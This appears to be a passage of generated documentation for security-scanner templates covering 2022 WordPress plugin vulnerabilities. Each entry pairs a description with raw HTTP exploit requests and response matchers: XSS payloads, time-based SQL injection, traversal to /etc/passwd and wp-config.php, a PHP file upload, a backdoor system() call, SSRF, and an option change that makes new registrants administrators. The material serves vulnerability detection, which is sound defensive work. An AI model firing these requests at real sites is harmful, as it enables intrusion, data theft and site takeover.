GET /wp-admin/admin.php?page=pm_add_group&id="><script>alert%28document.domain%29<%2Fscript> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_2, "text/html")
  2. status_code_2 == 200
  3. contains(body_2, "Extension Options")
  4. contains(body_2, "\<script>alert(document.domain)\</script>&tab")
- condition - and

---

# WordPress Feed Them Social \<3.0.1 - Cross-Site Scripting

## Description

- WordPress Feed Them Social plugin before 3.0.1 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the page.

- severity - medium
- tags - wp,wordpress,wp-plugin,wpscan,cve,cve2022,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=fts_refresh_token_ajax&feed=instagram&expires_in=%3Cimg%20src%20onerror%3Dalert%28document.domain%29%3E

### Matchers

**Type - word**

- part - body
- words
  1. \<img src onerror=alert(document.domain)>\<br/>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Easy Pricing Tables \<3.2.1 - Cross-Site Scripting

## Description

- WordPress Easy Pricing Tables plugin before 3.2.1 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before reflecting it back in a page available to any user both authenticated and unauthenticated when a specific setting is enabled.

- severity - medium
- tags - wp,wordpress,wpscan,cve,cve2022,wp-plugin,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=\<script>alert(document.domain)\</script>

### Matchers

**Type - word**

- part - body
- words
  1. \<script>alert(document.domain)\</script> - Color

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress TI WooCommerce Wishlist \<1.40.1 - SQL Injection

## Description

- WordPress TI WooCommerce Wishlist plugin before 1.40.1 contains a SQL injection vulnerability. The plugin does not sanitize and escape the item_id parameter before using it in a SQL statement via the wishlist/remove_product REST endpoint.

- severity - critical
- tags - sqli,ti-woocommerce-wishlist,wpscan,cve,cve2022,woocommerce,wordpress,wp-plugin,wp

## Requests

### Step - 1

```
@timeout: 10s
GET /?rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(5)%20--%20g HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=5

**Type - word**

- part - body
- words
  1. Product not found

**Type - status**

- status
  1. 400

---

# WordPress Videos sync PDF \<=1.7.4 - Local File Inclusion

## Description

- WordPress Videos sync PDF 1.7.4 and prior does not validate the p parameter before using it in an include statement, which could lead to local file inclusion.
- severity - high
- tags - lfi,wp-plugin,unauth,wpscan,cve,cve2022,packetstorm,wp,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=tout

### Matchers

**Type - word**

- part - body
- words
  1. failed to open stream: No such file or directory
  2. REPERTOIRE_VIDEOSYNCPDFreglages/Menu_Plugins/tout.php
- condition - and

**Type - status**

- status
  1. 200

---

# Country Selector \< 1.6.6 - Cross-Site Scripting

## Description

- The plugin does not sanitise and escape the country and lang parameters before outputting them back in the response, leading to a Reflected Cross-Site Scripting.

- severity - medium
- tags - wordpress-country-selector,wpscan,cve,cve2022,wp,wordpress,wp-plugin,xss

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
POST /wp-admin/admin-ajax.php?action=check_country_selector HTTP/2
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

country=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&lang=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&site_locate=en-US

```

### Matchers

**Type - word**

- part - body
- words
  1. \<img src=x onerror=alert(document.domain)>
  2. country*selector*
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress HTML2WP \<=1.0.0 - Arbitrary File Upload

## Description

- WordPress HTML2WP plugin through 1.0.0 contains an arbitrary file upload vulnerability. The plugin does not perform authorization and CSRF checks when importing files and does not validate them. As a result, an attacker can upload arbitrary files on the remote server.

- severity - critical
- tags - wp-plugin,wp,fileupload,unauth,wpscan,cve2022,wordpress,intrusive,cve,html2wp

## Requests

### Step - 1

```
POST /wp-admin/admin.php?page=html2wp-settings HTTP/1.1
Host: {{Hostname}}
Content-Length: 253
Content-Type: multipart/form-data; boundary=---------------------------7816508136577551742878603990
Connection: close

-----------------------------7816508136577551742878603990
Content-Disposition: form-data; name="local_importing[]"; filename="{{randstr}}.php"
Content-Type: text/html

<?php

echo "File Upload success";

-----------------------------7816508136577551742878603990--

```

### Step - 2

```
GET /wp-content/uploads/html2wp/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 302
  2. status_code_2 == 200
  3. contains(body_2, 'File Upload success')
- condition - and

---

# WordPress WPvivid Backup \< 0.9.76 - Local File Inclusion

## Description

- The plugin does not sanitise and validate a parameter before using it to read the content of a file, allowing high privilege users to read any file from the web server via a Traversal attack.
- severity - medium
- tags - wp,wpscan,seclists,packetstorm,authenticated,cve,cve2022,lfi,wordpress,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=WPvivid HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET /wp-admin/admin-ajax.php?_wpnonce={{nonce}}&action=wpvivid_download_export_backup&file_name=../../../../../../../etc/passwd&file_size=922 HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}/wp-admin/admin.php?page=WPvivid

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - nonce
- part - body
- group - 1
- regex
  1. "\_ajax_nonce":"([0-9a-z]+)"
- internal - True

---

# WordPress E2Pdf \<1.16.45 - Cross-Site Scripting

## Description

- WordPress E2Pdf plugin before 1.16.45 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape some of its settings, even when the unfiltered_html capability is disallowed. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site, making it possible to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve2022,wp-plugin,xss,authenticated,e2pdf,wpscan,cve,wordpress,wp

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
GET /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
POST /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_nonce={{nonce}}&e2pdf_user_email=&e2pdf_api=api.e2pdf.com&e2pdf_connection_timeout=300&e2pdf_processor=0&e2pdf_dev_update=0&e2pdf_url_format=siteurl&e2pdf_mod_rewrite=0&e2pdf_mod_rewrite_url=e2pdf%2F%25uid%25%2F&e2pdf_cache=0&e2pdf_cache=1&e2pdf_cache_fonts=0&e2pdf_cache_fonts=1&e2pdf_debug=0&e2pdf_hide_warnings=0&e2pdf_images_remote_request=0&e2pdf_images_timeout=30&e2pdf_revisions_limit=3&e2pdf_memory_time=0&e2pdf_developer=0&e2pdf_developer_ips=%3C%2Ftextarea%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E&submit=Save+Changes

```

### Step - 4

```
GET /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_4, 'placeholder=\"Developer IPs\" >\</textarea>\<svg/onload=alert(document.domain)>')
  2. contains(all_headers_4, "text/html")
  3. status_code_4 == 200
- condition - and

### Extractors

**Type - regex**

- name - nonce
- internal - True
- group - 1
- regex
  1. name="\_nonce" value="([0-9a-zA-Z]+)"

---

# WordPress All-in-One WP Migration \<=7.62 - Cross-Site Scripting

## Description

- WordPress All-in-One WP Migration plugin 7.62 and prior contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,all-in-one-wp-migration,authenticated,wpscan,cve2022,wordpress,wp-plugin,wp,xss

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
GET /wp-admin/admin.php?page=ai1wm_export HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET /wp-admin/admin-ajax.php?action=ai1wm_export&ai1wm_import=1&options%5Breplace%5D%5Bnew_value%5D%5B%5D=XSSPAYLOAD%3Csvg+onload=alert(document.domain)%3E&ai1wm_manual_export=1&secret_key={{secretkey}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_3, "text/html")
  2. status_code_3 == 200
  3. contains(body_3, '{\"new_value\":[\"XSSPAYLOAD\<svg onload=alert(document.domain)>')
- condition - and

### Extractors

**Type - regex**

- name - secretkey
- group - 1
- regex
  1. ai1wm_feedback"},"secret_key":"([0-9a-zA-Z]+)"
- internal - True

---

# WordPress Cab fare calculator \< 1.0.4 - Local File Inclusion

## Description

- The Cab fare calculator WordPress plugin before 1.0.4 does not validate the controller parameter before using it in require statements, which could lead to Local File Inclusion issues.

- severity - critical
- tags - cve2022,wordpress,wp-plugin,lfi,wp,edb,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WooCommerce Stored Exporter WordPress Plugin \< 2.7.1 - Cross-Site Scripting

## Description

- The plugin was affected by a reflected cross-site scripting vulnerability in the woo_ce admin page.
- severity - medium
- tags - wpscan,cve,cve2022,wordpress,wp-plugin,xss,woocommerce,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=woo_ce&failed=1&message=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Member Hero \<= 1.0.9 - Unauthenticated Remote Code Execution

## Description

- The Member Hero WordPress plugin through 1.0.9 lacks authorization checks, and does not validate the a request parameter in an AJAX action, allowing unauthenticated users to call arbitrary PHP functions with no arguments.

- severity - critical
- tags - unauth,wpscan,wp-plugin,rce,wp,wordpress,member-hero,cve,cve2022

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=memberhero_send_form&\_memberhero_hook=phpinfo

### Matchers

**Type - word**

- words
  1. PHP Extension
  2. PHP Version
  3. \<!DOCTYPE html
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. > PHP Version \<\/td>\<td class="v">([0-9.]+)

---

# WordPress All-in-one Floating Contact Form \<2.0.4 - Cross-Site Scripting

## Description

- WordPress All-in-one Floating Contact Form, Call, Chat, and 50+ Social Icon Tabs plugin before 2.0.4 contains a reflected cross-site scripting vulnerability on the my-sticky-elements-leads admin page.
- severity - medium
- tags - xss,wp-plugin,authenticated,wpscan,cve,cve2022,wordpress

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=my-sticky-elements-leads&search-contact=xxxx%22%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29+x HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \<img src onerror=alert(`document.domain`) x">

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Plugin WPQA \< 5.5 - Unauthenticated Private Message Disclosure

## Description

- The plugin which is a companion to the Discy and Himer themes, lacks authentication in a REST API endpoint, allowing unauthenticated users to discover private questions sent between users on the site.

- severity - medium
- tags - cve,cve2022,wordpress,wp-plugin,wpqa,idor,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/wp/v2/asked-question

### Matchers

**Type - word**

- part - body
- words
  1. "id":
  2. "rendered":
- condition - and

**Type - status**

- status
  1. 200

---

# Directorist \< 7.3.1 - Unauthenticated Email Address Disclosure

## Description

- The plugin discloses the email address of all users in an AJAX action available to both unauthenticated and any authenticated users
- severity - medium
- tags - cve,cve2022,wp-plugin,wpscan,wordpress,wp,directorist,unauth,disclosure

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=directorist_author_pagination

### Matchers

**Type - word**

- part - body
- words
  1. directorist-authors**card**details\_\_top
  2. directorist-authors**card**info-list
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Simply Schedule Appointments \< 1.5.7.7 - Email Address Disclosure

## Description

- The Simply Schedule Appointments WordPress plugin before 1.5.7.7 is missing authorisation in a REST endpoint, allowing unauthenticated users to retrieve WordPress users details such as name and email address.

- severity - medium
- tags - simply-schedule-appointments,unauth,wpscan,cve,cve2022,wordpress,wp-plugin,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/ssa/v1/users

### Matchers

**Type - regex**

- regex
  1. response_code":200
  2. "email":"([a-zA-Z-_0-9@.]+)","display*name":"([a-zA-Z-_0-9@.]+)","gravatar_url":"http?:\\\/\\\/([a-z0-9A-Z.\\\/?=&@*-]+)"
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# LearnPress \<4.1.6 - Cross-Site Scripting

## Description

- WordPress LearnPress plugin before 4.1.6 contains a cross-site scripting vulnerability. It does not sanitize and escape the lp-dismiss-notice before outputting it back via the lp_background_single_email AJAX action.

- severity - medium
- tags - wp,wp-plugin,wordpress,cve,cve2022,learnpress,wpscan,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx\<img%20src=x%20onerror=alert(document.domain)>

### Matchers

**Type - word**

- part - body
- words
  1. {"dismissed":"xxx\<img src=x onerror=alert(document.domain)>"}

**Type - word**

- words
  1. text/html
- part - header

**Type - status**

- status
  1. 200

---

# uDraw \<3.3.3 - Local File Inclusion

## Description

- uDraw before 3.3.3 does not validate the url parameter in its udraw_convert_url_to_base64 AJAX action (available to both unauthenticated and authenticated users) before using it in the file_get_contents function and returning its content base64 encoded in the response. As a result, unauthenticated users could read arbitrary files on the web server (such as /etc/passwd, wp-config.php etc).
- severity - high
- tags - wp,wordpress,wp-plugin,unauth,cve,cve2022,lfi,udraw,wpscan

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

action=udraw_convert_url_to_base64&url=/etc/passwd

```

### Matchers

**Type - word**

- words
  1. cm9vd
  2. data:image\/;base64
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress WooCommerce \<3.1.2 - Arbitrary Function Call

## Description

- WordPress WooCommerce plugin before 3.1.2 does not have authorisation and CSRF checks in the wpt_admin_update_notice_option AJAX action (available to both unauthenticated and authenticated users), as well as does not validate the callback parameter, allowing unauthenticated attackers to call arbitrary functions with either none or one user controlled argument.
- severity - critical
- tags - wpscan,wp,wp-plugin,wordpress,cve,cve2022,unauth

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

option_key=a&perpose=update&callback=phpinfo

```

### Matchers

**Type - word**

- words
  1. PHP Extension
  2. PHP Version
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. > PHP Version \<\/td>\<td class="v">([0-9.]+)

---

# Ninja Job Board \< 1.3.3 - Resume Disclosure via Directory Listing

## Description

- The plugin does not protect the directory where it stores uploaded resumes, making it vulnerable to unauthenticated Directory Listing which allows the download of uploaded resumes.
- severity - high
- tags - ninja,exposure,wpscan,cve,cve2022,wordpress,wp-plugin,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp/wp-content/uploads/wpjobboard/
- {{BaseURL}}/wp-content/uploads/wpjobboard/

### Matchers

**Type - word**

- part - body
- words
  1. Index of /wp/wp-content/uploads/wpjobboard
  2. Index of /wp-content/uploads/wpjobboard

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Gallery \<2.0.0 - Cross-Site Scripting

## Description

- WordPress Gallery plugin before 2.0.0 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the response of an AJAX action, available to both unauthenticated and authenticated users.
- severity - medium
- tags - wpscan,cve2022,wp,xss,wordpress,gallery,unauth,cve,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=\<script>alert(document.domain)\</script>

### Matchers

**Type - word**

- part - body
- words
  1. wpdevar_gall_img_url_h[\<script>alert(document.domain)\</script>]

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# All In One Video Gallery Plugin - Unauthenticated Arbitrary File Download & SSRF vulnerability

## Description

- Unauthenticated Arbitrary File Download & SSRF vulnerability in WordPress All In One Video Gallery Plugin (versions \<= 2.6.0).

- tags - cve2022,wp-plugin,unauth,ssrf,wpscan,cve,wordpress,wp,all-in-one-video-gallery

## Requests

### Step - 1

```
@timeout: 10s
GET /index.php/video/?dl={{base64('http://interact.sh/')}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. Interactsh Server

**Type - status**

- status
  1. 200

---

# WordPress WPQA \<5.4 - Cross-Site Scripting

## Description

- WordPress WPQA plugin prior to 5.4 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter on its reset password form.

- severity - medium
- tags - wpscan,xss,wordpress,wp-plugin,wp,cve,cve2022,wpqa

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Content-Type: application/x-www-form-urlencoded

user_name={{user}}&email={{user}}@{{Host}}&pass1={{pass}}&pass2={{pass}}&phone={{rand_text_numeric(10)}}&agree_terms=on&form_type=wpqa-signup&action=wpqa_ajax_signup_process

```

### Step - 2

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Content-Type: application/x-www-form-urlencoded

user_mail={{user}}@{{Host}}&form_type=wpqa_forget&action=wpqa_ajax_password_process&redirect_to={{url_encode(redirect_to)}}

```

### Matchers

**Type - word**

- part - body
- words
  1. {{redirect_to}}
  2. "success":1
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Formcraft3 \<3.8.28 - Server-Side Request Forgery

## Description

- Formcraft3 before version 3.8.2 does not validate the URL parameter in the formcraft3_get AJAX action, leading to server-side request forgery issues exploitable by unauthenticated users.
- severity - critical
- tags - wp,wp-plugin,wordpress,cve,formcraft3,wpscan,ssrf,cve2022,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# NotificationX WordPress plugin \< 2.3.9 - SQL Injection

## Description

- The NotificationX WordPress plugin before 2.3.9 does not sanitise and escape the nx_id parameter before using it in a SQL statement, leading to an Unauthenticated Blind SQL Injection.

- severity - critical
- tags - cve2022,wordpress,wp-plugin,wp,sqli,notificationx,wpscan,cve

## Requests

### Step - 1

```
@timeout: 15s
POST /?rest_route=/notificationx/v1/analytics HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

nx_id=sleep(6) -- x

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=6
  2. status_code == 200
  3. contains(body, "\"data\":{\"success\":true}")
- condition - and

---

# WordPress Shortcodes and Extra Features for Phlox \<2.9.8 - Cross-Site Scripting

## Description

- WordPress Shortcodes and extra features plugin for the Phlox theme before 2.9.8 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape a parameter before outputting it back in the response. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - wordpress,xss,auxin-elements,wpscan,cve,cve2017,wp-plugin,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=aux_the_recent_products&data[wp_query_args][post_type]=post&data[title]=%3Cscript%3Ealert(document.domain)%3C/script%3E

### Matchers

**Type - word**

- part - body
- words
  1. widget-title">\<script>alert(document.domain)\</script>\</h3>
  2. aux-widget
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Nirweb Support \<2.8.2 - SQL Injection

## Description

- WordPress Nirweb support plugin before 2.8.2 contains a SQL injection vulnerability. The plugin does not sanitize and escape a parameter before using it in a SQL statement via an AJAX action. An attacker can possibly obtain sensitive information from a database, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wp,sqli,wpscan,nirweb-support,unauth

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5({{num}}),NULL,NULL,NULL,NULL,NULL-- -

```

### Matchers

**Type - word**

- part - body
- words
  1. {{md5(num)}}

**Type - status**

- status
  1. 200

---

# WordPress Page Builder KingComposer \<=2.9.6 - Open Redirect

## Description

- WordPress Page Builder KingComposer 2.9.6 and prior does not validate the id parameter before redirecting the user to it via the kc_get_thumbn AJAX action (which is available to both unauthenticated and authenticated users).
- severity - high
- tags - cve,cve2022,wp-plugin,redirect,wordpress,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=kc_get_thumbn&id=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# Pricing Deals for WooCommerce \< 2.0.3 - Unauthenticated SQL Injection

## Description

- The Pricing Deals for WooCommerce WordPress plugin through 2.0.2.02 does not properly sanitise and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to an unauthenticated SQL injection.

- severity - critical
- tags - cve,cve2022,sqli,wpscan,wordpress,wp-plugin,wp,pricing-deals-for-woocommerce,unauth

## Requests

### Step - 1

```
@timeout: 15s
GET /wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+- HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=6
  2. status_code == 500
  3. contains(body, "been a critical error")
- condition - and

---

# WordPress Permalink Manager \<2.2.15 - Cross-Site Scripting

## Description

- WordPress Permalink Manager Lite and Pro plugins before 2.2.15 contain a reflected cross-site scripting vulnerability. They do not sanitize and escape query parameters before outputting them back in the debug page.

- severity - medium
- tags - wp-plugin,wpscan,cve,cve2022,xss,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?p=%3Cimg%20src%20onerror=alert(/XSS/)%3E&debug_url=1

### Matchers

**Type - word**

- part - body
- words
  1. \<img src onerror=alert(/XSS/)>
  2. pm_query
- condition - and

**Type - word**

- part - header
- words
  1. text/html

---

# WordPress Admin Word Count Column 2.2 - Local File Inclusion

## Description

- The plugin does not validate the path parameter given to readfile(), which could allow unauthenticated attackers to read arbitrary files on server running old version of PHP susceptible to the null byte technique. This could also lead to RCE by using a Phar Deserialization technique.

- severity - critical
- tags - packetstorm,wpscan,cve,cve2022,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\0

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# The School Management \< 9.9.7 - Remote Code Execution

## Description

- The School Management plugin before version 9.9.7 contains an obfuscated backdoor injected in it's license checking code that registers a REST API handler, allowing an unauthenticated attacker to execute arbitrary PHP code on the site.
- severity - critical
- tags - rce,wp,backdoor,wpscan,cve,cve2022,wordpress

## Requests

### Step - 1

```
POST /wp-json/am-member/license HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

blowfish=1&blowf=system('{{cmd}}');

```

### Matchers

**Type - word**

- part - body
- words
  1. 9061-2202-EVC

---

# WordPress Ad Inserter \<2.7.10 - Cross-Site Scripting

## Description

- WordPress Ad Inserter plugin before 2.7.10 contains a cross-site scripting vulnerability. It does not sanitize and escape the html_element_selection parameter before outputting it back in the page.

- severity - medium
- tags - wordpress,xss,wpscan,cve,cve2022

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}
  - html_element_selection=</script><img+src+onerror=alert(document.domain)>

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - body
- words
  1. \</script>\<img src onerror=alert(document.domain)>
  2. ad-inserter
- condition - and

**Type - word**

- part - header
- words
  1. text/html

---

# Daily Prayer Time \< 2022.03.01 - Unauthenticated SQLi

## Description

- The Daily Prayer Time WordPress plugin before 2022.03.01 does not sanitise and escape the month parameter before using it in a SQL statement via the get_monthly_timetable AJAX action (available to unauthenticated users), leading to an unauthenticated SQL injection.

- severity - critical
- tags - sqli,wordpress,wp-plugin,unauth,daily-prayer-time-for-mosques,wpscan,cve,cve2022,wp

## Requests

### Step - 1

```
@timeout: 10s
GET /wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn) HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=6
  2. status_code == 200
  3. contains(content_type, "text/html")
  4. contains(body, "dptTimetable customStyles dptUserStyles")
- condition - and

---

# WordPress Simple File List \<3.2.8 - Local File Inclusion

## Description

- WordPress Simple File List before 3.2.8 is vulnerable to local file inclusion via the eeFile parameter in the ~/includes/ee-downloader.php due to missing controls which make it possible for unauthenticated attackers retrieve arbitrary files.

- severity - high
- tags - wp,wp-plugin,wpscan,cve,cve2022,lfi,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Shareaholic \< 9.7.6 - Information Disclosure

## Description

- The Professional Social Sharing Buttons, Icons & Related Posts WordPress plugin before 9.7.6 does not have proper authorisation check in one of the AJAX action, available to unauthenticated (in v \< 9.7.5) and author+ (in v9.7.5) users, allowing them to call it and retrieve various information such as the list of active plugins, various version like PHP, cURL, WP etc.
- severity - medium
- tags - cve,cve2022,wordpress,wp,wp-plugin,exposure,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=shareaholic_debug_info

### Matchers

**Type - word**

- part - body
- words
  1. plugin_version
  2. shareaholic_server_reachable
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Sitemap by click5 \< 1.0.36 - Unauthenticated Arbitrary Options Update

## Description

- The plugin does not have authorisation and CSRF checks when updating options via a REST endpoint, and does not ensure that the option to be updated belongs to the plugin

- severity - high
- tags - wp,wp-plugin,sitemap,wpscan,cve,cve2022,wordpress

## Requests

### Step - 1

```
POST /wp-json/click5_sitemap/API/update_html_option_AJAX HTTP/1.1
Host: {{Hostname}}
Content-type: application/json;charset=UTF-8

{"users_can_register":"1"}

```

### Step - 2

```
POST /wp-json/click5_sitemap/API/update_html_option_AJAX HTTP/1.1
Host: {{Hostname}}
Content-type: application/json;charset=UTF-8

{"default_role":"administrator"}

```

### Step - 3

```
POST /wp-json/click5_sitemap/API/update_html_option_AJAX HTTP/1.1
Host: {{Hostname}}
Content-type: application/json;charset=UTF-8

{"users_can_register":"0"}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers, "application/json")
  2. status_code == 200
